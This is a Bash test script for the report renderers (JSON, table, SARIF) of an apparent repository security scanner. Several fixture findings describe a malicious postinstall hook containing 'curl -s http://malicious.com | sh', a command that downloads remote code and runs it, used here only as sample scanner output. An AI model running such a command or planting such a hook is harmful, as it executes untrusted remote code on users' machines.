#!/bin/bash
# Acceptance checks for TASK_05 (finding model and renderers, spec Section 7 and 8.2 -f, -o).
# Run with /bin/bash so the Bash 3.2 requirement is tested: tests/report_test.sh

ROOT=$(cd -P "$(dirname "$0")/.." && pwd)
PASS=0
FAIL=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# run <bash snippet>: runs the snippet in a fresh shell with lib/report.sh loaded.
# Stdout and stderr are captured separately into $WORK/out and $WORK/err. The snippet's exit
# status is returned.
run() {
  /bin/bash -c '. "$1/lib/report.sh"; '"$1" _ "$ROOT" >"$WORK/out" 2>"$WORK/err"
}

# check <name> <got> <want>
check() {
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL: $1"
    echo "    got:"
    printf '%s\n' "$2" | sed 's/^/      /'
    echo "    want:"
    printf '%s\n' "$3" | sed 's/^/      /'
  fi
}

# Spec 7.2 example, as the finding_add calls that produce it.
EXAMPLE_ADD='
finding_add MALICIOUS_BUILD_HOOK CRITICAL package.json "Postinstall script executes dynamic network call: curl -s http://malicious.com | sh"
finding_add VULNERABLE_DEPENDENCY HIGH package-lock.json "Dependency '\''lodash@4.17.15'\'' affected by advisory GHSA-35jh-f384-659f"
'

# The JSON report matches the spec 7.2 example exactly.
run "$EXAMPLE_ADD"'
report_emit json "" /Users/developer/projects/sample-app'
want_json='{
  "target_directory": "/Users/developer/projects/sample-app",
  "total_findings": 2,
  "critical_findings": 1,
  "findings": [
    {
      "category": "MALICIOUS_BUILD_HOOK",
      "severity": "CRITICAL",
      "file": "package.json",
      "description": "Postinstall script executes dynamic network call: curl -s http://malicious.com | sh"
    },
    {
      "category": "VULNERABLE_DEPENDENCY",
      "severity": "HIGH",
      "file": "package-lock.json",
      "description": "Dependency '\''lodash@4.17.15'\'' affected by advisory GHSA-35jh-f384-659f"
    }
  ]
}'
check "JSON matches the spec 7.2 example" "$(cat "$WORK/out")" "$want_json"

# Zero findings give valid JSON with an empty array (spec 7.1 schema).
run 'report_emit json "" /tmp/empty'
check "zero findings: JSON is valid with an empty array" \
  "$(jq -c '[.total_findings, .critical_findings, .findings]' "$WORK/out")" '[0,0,[]]'

# Spec 7.2 field names and order, and the four finding fields.
run "$EXAMPLE_ADD"'
report_emit json "" /tmp/x'
check "top-level keys in spec order" \
  "$(jq -r 'keys_unsorted | join(",")' "$WORK/out")" \
  "target_directory,total_findings,critical_findings,findings"
check "each finding has the four required fields" \
  "$(jq -r '.findings[] | keys_unsorted | join(",")' "$WORK/out" | sort -u)" \
  "category,severity,file,description"

# Quotes, backslashes, tabs, newlines, and control characters survive a JSON round trip.
# Exported so the child shell and jq can read them.
export HOSTILE_FILE=$'dir "q"\\back\tab\nline\x01ctl.js'
export HOSTILE_DESC=$'say "hi" \\ path\tend\x7f'
run 'finding_add SAST HIGH "$HOSTILE_FILE" "$HOSTILE_DESC"; report_emit json "" "/tmp/t \"x\""'
check "hostile file and description parse as JSON" \
  "$(jq -e '.findings[0].file == env.HOSTILE_FILE and .findings[0].description == env.HOSTILE_DESC and .target_directory == "/tmp/t \"x\""' "$WORK/out" >/dev/null 2>&1; echo $?)" "0"

# A JSON string with no special characters is left as is.
run 'report_json_string "plain-name.js"; printf %s "$_JSON_STR"'
check "plain string is quoted without changes" "$(cat "$WORK/out")" '"plain-name.js"'

# Non-ASCII UTF-8 passes through unchanged, and the result is valid JSON.
run 'finding_add SAST LOW "café/naïve.js" "non-ASCII name"; report_emit json "" /tmp/u'
check "UTF-8 file name round-trips" \
  "$(jq -r '.findings[0].file' "$WORK/out")" "café/naïve.js"

# Table is the plain-text default format, with a summary line and no color codes.
run "$EXAMPLE_ADD"'
report_emit table "" /Users/developer/projects/sample-app'
check "table has headers, rows, summary, and no ANSI codes" \
  "$(cat "$WORK/out")" "$(printf '%s\n' \
    'Target: /Users/developer/projects/sample-app' \
    '' \
    'SEVERITY  CATEGORY               FILE               DESCRIPTION' \
    'CRITICAL  MALICIOUS_BUILD_HOOK   package.json       Postinstall script executes dynamic network call: curl -s http://malicious.com | sh' \
    'HIGH      VULNERABLE_DEPENDENCY  package-lock.json  Dependency '\''lodash@4.17.15'\'' affected by advisory GHSA-35jh-f384-659f' \
    '' \
    'Total findings: 2, critical: 1')"
if grep -q $'\033' "$WORK/out"; then
  FAIL=$((FAIL + 1))
  echo "FAIL: table output contains ANSI escape codes"
else
  PASS=$((PASS + 1))
fi

# A control character in a table cell cannot split a row.
run 'finding_add SAST LOW "$HOSTILE_FILE" "tab	and newline
here"; report_emit table "" /tmp/t'
check "control characters in table cells keep one row per finding" \
  "$(grep -c '^LOW' "$WORK/out")" "1"

# -o writes the report to the file and leaves stdout empty (spec 8.2).
run "$EXAMPLE_ADD"'
report_emit json "'"$WORK"'/report.json" /tmp/o'
check "-o: stdout is empty" "$(cat "$WORK/out")" ""
check "-o: file holds the JSON report" "$(jq -r '.total_findings' "$WORK/report.json")" "2"

# -o works for table too.
run "$EXAMPLE_ADD"'
report_emit table "'"$WORK"'/report.txt" /tmp/o'
check "-o table: stdout is empty and the file has the table" \
  "$(head -1 "$WORK/report.txt") $(cat "$WORK/out")" "Target: /tmp/o "

# An unwritable -o path fails with exit 1 and a message (spec 2.4).
run "$EXAMPLE_ADD"'
report_emit json "'"$WORK"'/no-such-dir/report.json" /tmp/o; echo "status=$?"'
check "-o unwritable: exit 1 with a message on stderr" \
  "$(cat "$WORK/out") $(cat "$WORK/err")" \
  "status=1 repo-shield: cannot write output file: $WORK/no-such-dir/report.json"

# SARIF (item 30 mapping). A target with a real file, so the snippet comes from the file.
S="$WORK/sarif-target"
mkdir -p "$S/src"
printf 'const a = 1;\nconst s = "q\\";\n' > "$S/src/a b.js"
export S_FILE='src/a b.js'
run 'finding_add MALICIOUS_BUILD_HOOK CRITICAL package.json "postinstall: curl | sh"
finding_add VULNERABLE_DEPENDENCY HIGH package-lock.json "lodash advisory"
finding_add SAST MEDIUM "$S_FILE" "quoted string" 2
finding_add SAST LOW "$S_FILE" "no line"
finding_add SAST LOW "$S_FILE" "past end" 9
report_emit sarif "" "'"$S"'"'
check "sarif: version and schema" \
  "$(jq -r '[.version, ."$schema"] | join(" ")' "$WORK/out")" \
  "2.1.0 https://json.schemastore.org/sarif-2.1.0.json"
check "sarif: one rule per category, with security-severity from the highest finding" \
  "$(jq -c '.runs[0].tool.driver.rules[] | [.id, .properties["security-severity"], .properties.tags]' "$WORK/out" | tr '\n' ' ')" \
  '["MALICIOUS_BUILD_HOOK","9.0",["security"]] ["VULNERABLE_DEPENDENCY","7.0",["security"]] ["SAST","4.0",["security"]] '
check "sarif: severity maps to level (CRITICAL and HIGH error, MEDIUM warning, LOW note)" \
  "$(jq -r '.runs[0].results[] | .level' "$WORK/out" | tr '\n' ' ')" \
  "error error warning note note "
check "sarif: ruleId and message come from category and description" \
  "$(jq -r '.runs[0].results[0] | [.ruleId, .message.text] | join("|")' "$WORK/out")" \
  "MALICIOUS_BUILD_HOOK|postinstall: curl | sh"
check "sarif: file is a percent-encoded URI" \
  "$(jq -r '.runs[0].results[2].locations[0].physicalLocation.artifactLocation.uri' "$WORK/out")" \
  "src/a%20b.js"
check "sarif: a finding with a line has region and snippet from the file" \
  "$(jq -c '.runs[0].results[2].locations[0].physicalLocation.region' "$WORK/out")" \
  '{"startLine":2,"snippet":{"text":"const s = \"q\\\";"}}'
check "sarif: a finding without a line has no region" \
  "$(jq -c '.runs[0].results[1].locations[0].physicalLocation | keys' "$WORK/out")" '["artifactLocation"]'
check "sarif: a line past the end of the file has no snippet" \
  "$(jq -c '.runs[0].results[4].locations[0].physicalLocation.region' "$WORK/out")" '{"startLine":9}'

# Zero findings give a valid log with empty rules and results (item 35, spec 7.1 schema).
run 'report_emit sarif "" /tmp/empty'
check "sarif: zero findings have empty rules and results" \
  "$(jq -c '[.runs[0].tool.driver.rules, .runs[0].results]' "$WORK/out")" '[[],[]]'

# -o writes SARIF to the file, and stdout is empty.
run "$EXAMPLE_ADD"'
report_emit sarif "'"$WORK"'/report.sarif" /tmp/o'
check "sarif -o: stdout is empty and the file is SARIF" \
  "$(cat "$WORK/out") $(jq -r '.version' "$WORK/report.sarif")" " 2.1.0"

# The optional line is kept in JSON only when set. The spec 7.2 example has no line.
run 'finding_add SAST HIGH src/x.js "with line" 12; finding_add SAST HIGH src/x.js "without"; report_emit json "" /tmp/j'
check "json: line appears only on findings that have one" \
  "$(jq -c '[.findings[].line]' "$WORK/out")" '[12,null]'

# A line must be a positive number.
run 'finding_add SAST HIGH f.js d 0; echo "status=$?"; finding_add SAST HIGH f.js d abc; echo "status=$?"'
check "finding_add rejects a line that is not a positive number" \
  "$(tr '\n' ' ' < "$WORK/out")" "status=1 status=1 "

# SARIF schema check. Runs only when REPO_SHIELD_SARIF_SCHEMA names the SARIF 2.1.0 schema file
# and python3 has jsonschema. Otherwise it is reported as skipped, not as a pass.
if [ -n "${REPO_SHIELD_SARIF_SCHEMA:-}" ] && python3 -c 'import jsonschema' 2>/dev/null; then
  run "$EXAMPLE_ADD"'
report_emit sarif "" "'"$S"'"'
  if python3 -c '
import json, sys, jsonschema
schema = json.load(open(sys.argv[1]))
jsonschema.validate(json.load(open(sys.argv[2])), schema)' "$REPO_SHIELD_SARIF_SCHEMA" "$WORK/out" 2>"$WORK/err"; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL: SARIF output does not validate against the 2.1.0 schema"
    cat "$WORK/err"
  fi
else
  echo "SKIP: SARIF schema check (set REPO_SHIELD_SARIF_SCHEMA and install jsonschema)"
fi

# finding_add rejects an invalid severity and missing fields, and stores nothing.
run 'finding_add SAST SEVERE f.js "bad severity"; echo "status=$?"; finding_add "" HIGH f.js d; echo "status=$?"; echo "count=${#FINDING_CATEGORY[@]}"'
check "finding_add rejects bad input and stores nothing" \
  "$(tr '\n' ' ' < "$WORK/out")$(cat "$WORK/err" | wc -l | tr -d ' ')" \
  "status=1 status=1 count=0 2"

echo "passed: $PASS, failed: $FAIL"
[ "$FAIL" -eq 0 ]
